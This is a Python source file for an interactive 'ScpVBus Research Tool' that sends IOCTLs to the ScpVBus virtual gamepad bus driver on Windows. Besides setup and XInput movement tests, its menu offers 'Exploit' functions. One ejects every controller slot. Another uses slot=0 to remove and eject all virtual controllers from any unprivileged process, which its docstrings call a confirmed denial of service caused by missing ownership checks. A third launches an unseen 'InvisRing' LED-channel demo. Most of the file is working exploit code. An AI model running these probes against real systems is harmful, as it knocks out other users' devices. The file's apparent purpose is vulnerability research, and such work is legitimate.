"""Interactive ScpVBus research menu and bus IOCTL probes."""

from pathlib import Path
import subprocess
import sys
import time
from Arch.bht_win32 import *
from Arch.bht_devices import *
from Arch.controller_movement import run as run_controller_movement



def setup_plugin(h):
    """Plug in controllers on slots 1-4 and check existence after each."""
    print(f"\n{BOLD}[*] PlugIn slots 1-4 + existence check{RESET}")
    separator()
    for slot in range(1, 5):
        payload = struct.pack("<IIII", 0x10, slot, 0, 0)
        r = send_ioctl(h, IOCTL_SCPVBUS_PLUGIN, payload)
        print_result(r, f"PlugIn  slot={slot}")

        # query existence immediately
        eq = struct.pack("<IIII", 0x10, slot, 0, 0)
        re = send_ioctl(h, IOCTL_SCPVBUS_EXISTS, eq)
        print_result(re, f"Exists? slot={slot}")
    input(f"\n  {DIM}Press ENTER to continue...{RESET}")





def exploit_mass_eject(h):
    """
    No-ownership-check eject on all 4 slots simultaneously.
    Any process can trigger a coordinated PnP removal of all
    virtual controllers — DoS against any ScpVBus user.
    """
    print(f"\n{BOLD}[*] Exploit: mass eject all slots (no ownership check){RESET}")
    separator()
    print(f"  {YELLOW}[!] This will eject all virtual controllers visible to Windows{RESET}\n")

    for slot in range(1, 5):
        p = struct.pack("<IIII", 0x10, slot, 0, 0)
        r = send_ioctl(h, IOCTL_SCPVBUS_EJECT, p)
        print_result(r, f"Eject slot={slot}")

    print(f"\n  {GREEN}[+] PnP eject IRPs issued for all slots{RESET}")
    input(f"\n  {DIM}Press ENTER to continue...{RESET}")





def exploit_slot0_mass_remove(h):
    """
    Slot 0 = all controllers on both Remove and Eject paths.
    No ownership check, no PID validation, no slot enumeration needed.
    Any unprivileged process that can open the device interface can
    nuke every virtual controller system-wide in two IOCTLs.

    Findings:
      Remove slot=0 → OK (confirmed)
      Eject  slot=0 → OK (confirmed)
      Exists slot=0 → err 87 (all-slots shortcut NOT on query path)
    """
    print(f"\n{BOLD}[*] Exploit: slot=0 mass remove + eject (any PID, all controllers){RESET}")
    separator()
    print(f"  {YELLOW}[!] Sends slot=0 Remove then Eject — affects ALL virtual controllers{RESET}\n")

    # plugin slots 1-4 first so there is something to remove
    print(f"  {DIM}Setting up: PlugIn slots 1-4...{RESET}")
    for slot in range(1, 5):
        p = struct.pack("<IIII", 0x10, slot, 0, 0)
        send_ioctl(h, IOCTL_SCPVBUS_PLUGIN, p)

    time.sleep(0.3)

    # slot=0 mass remove
    p0 = struct.pack("<IIII", 0x10, 0, 0, 0)
    r_remove = send_ioctl(h, IOCTL_SCPVBUS_REMOVE, p0)
    print_result(r_remove, "Remove slot=0 (ALL — no ownership check)")

    # slot=0 mass eject
    r_eject = send_ioctl(h, IOCTL_SCPVBUS_EJECT, p0)
    print_result(r_eject, "Eject  slot=0 (ALL — no ownership check)")

    # verify all gone
    print()
    all_gone = True
    for slot in range(1, 5):
        eq = struct.pack("<IIII", 0x10, slot, 0, 0)
        re = send_ioctl(h, IOCTL_SCPVBUS_EXISTS, eq)
        print_result(re, f"Exists slot={slot} (expect: not found)")
        if re["ok"]:
            all_gone = False

    print()
    if all_gone:
        print(f"  {GREEN}[+] Exploit confirmed: all slots cleared via slot=0 from single IOCTL{RESET}")
    else:
        print(f"  {YELLOW}[?] Some slots still exist — may need force flag or timing{RESET}")

    input(f"\n  {DIM}Press ENTER to continue...{RESET}")


# ── Internal IOCTL / HID handler probes ──────────────────────────────────────


def exploit_demonstrate_invisring():
    """Run the short local virtual-LED channel demonstration."""
    root = Path(__file__).resolve().parent
    script = root / "Arch" / "led_link.py"
    print(f"\n{BOLD}[*] Demonstrate InvisRing: local virtual-LED message{RESET}")
    separator()
    result = subprocess.run([sys.executable, str(script), "demonstrate"], cwd=str(root))
    if result.returncode:
        print(f"\n  {YELLOW}[!] Demonstration failed (exit {result.returncode}).{RESET}")
    input(f"\n  {DIM}Press ENTER to continue...{RESET}")


def test_controller_movement():
    """Create an isolated controller and verify both stick axes through XInput."""
    print(f"\n{BOLD}[*] ScpVBus movement and XInput readback{RESET}")
    separator()
    result = run_controller_movement()
    print(f"\n  {'PASS' if result == 0 else f'FAIL (code {result})'}")
    input(f"\n  {DIM}Press ENTER to continue...{RESET}")


def draw_menu(items, selected, device_path, handle_ok):
    cls()
    print(f"\n  {BOLD}{CYAN}ScpVBus Research Tool{RESET}  "
          f"{DIM}{'[HANDLE OK]' if handle_ok else '[NO HANDLE]'}{RESET}")
    print(f"  {DIM}{device_path or 'device not found'}{RESET}\n")

    for i, (label, _) in enumerate(items):
        if i == selected:
            print(f"  {GREEN}▶  {BOLD}{label}{RESET}")
        else:
            print(f"     {DIM}{label}{RESET}")

    print(f"\n  {DIM}↑/↓ navigate   ENTER run   Q quit{RESET}\n")



def run_menu(device_path, handle):
    divider = "\u2500" * 40
    items = [
        ("Setup: PlugIn slots 1-4 + exists check", lambda: setup_plugin(handle)),
        ("Test: left/right stick movement via XInput", test_controller_movement),
        (divider, None),
        ("Exploit: Demonstrate InvisRing", exploit_demonstrate_invisring),
        ("Exploit: mass eject all slots (no PID check)", lambda: exploit_mass_eject(handle)),
        ("Exploit: slot=0 mass remove (any PID, 1 IOCTL)", lambda: exploit_slot0_mass_remove(handle)),
    ]

    sel = 0
    selectable = [i for i, (_, fn) in enumerate(items) if fn is not None]

    while True:
        draw_menu(items, sel, device_path, handle is not None)
        key = _getch()

        if key == QUIT:
            break
        elif key == UP:
            # move to previous selectable item
            cur_pos = selectable.index(sel) if sel in selectable else 0
            sel = selectable[(cur_pos - 1) % len(selectable)]
        elif key == DOWN:
            cur_pos = selectable.index(sel) if sel in selectable else 0
            sel = selectable[(cur_pos + 1) % len(selectable)]
        elif key == ENTER:
            if sel in selectable:
                cls()
                try:
                    items[sel][1]()
                except Exception as exc:
                    print(f"\n  {RED}[!] Exception: {exc}{RESET}")
                    input(f"  {DIM}Press ENTER...{RESET}")

# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    cls()
    print(f"\n  {CYAN}{BOLD}ScpVBus Research Tool — initialising...{RESET}\n")

    paths = discover_device()
    device_path = paths[0] if paths else None
    handle = None
    if device_path:
        print(f"  {GREEN}[+]{RESET} Found: {device_path}")
        if len(paths) > 1:
            print(f"  {DIM}    ({len(paths)-1} additional interface(s) found, using first){RESET}")
        print(f"  {DIM}Opening device...{RESET}")
        handle, err = open_device(device_path)
        if not handle:
            code, msg = err
            print(f"  {YELLOW}[!] Open failed ({code}: {msg}) — ScpVBus setup and movement test are unavailable{RESET}")
        else:
            print(f"  {GREEN}[+]{RESET} Handle acquired (RW)\n")
    else:
        print(f"  {YELLOW}[!] No ScpVBus interface found; the setup and movement test are unavailable.{RESET}")

    time.sleep(0.8)

    try:
        run_menu(device_path, handle)
    finally:
        if handle:
            CloseHandle(handle)
        print(f"\n  {DIM}Handles closed. Goodbye.{RESET}\n")


if __name__ == "__main__":
    main()
